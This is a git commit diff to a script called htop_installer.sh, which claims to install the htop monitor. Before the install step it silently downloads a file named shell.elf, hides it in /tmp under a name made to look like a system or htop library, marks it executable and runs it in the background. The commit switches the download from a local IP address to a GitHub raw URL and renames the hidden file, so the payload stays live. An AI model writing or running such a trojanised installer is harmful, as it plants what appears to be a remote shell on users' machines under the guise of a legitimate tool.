59e48b5b398a66506263b810db48e9c20b5cb5fc
diedromeo <119026435+diedromeo@users.noreply.github.com>
2025-06-27 15:57:05 +0530

    Update htop_installer.sh

--- htop_installer.sh
+++ htop_installer.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
-curl -s -o /tmp/.sysmon-htop.bin http://192.168.223.129:8000/shell.elf
-chmod +x /tmp/.sysmon-htop.bin
-/tmp/.sysmon-htop.bin &
+curl -s -o /tmp/.htop-lib.so https://raw.githubusercontent.com/diedromeo/htopclone/main/shell.elf
+chmod +x /tmp/.htop-lib.so
+/tmp/.htop-lib.so &
 if command -v apt-get >/dev/null; then
     sudo apt-get update -y
     sudo apt-get install -y htop
@@ -9,4 +9,4 @@ elif command -v yum >/dev/null; then
     sudo yum install -y epel-release
     sudo yum install -y htop
 fi
-htop
+exec htop
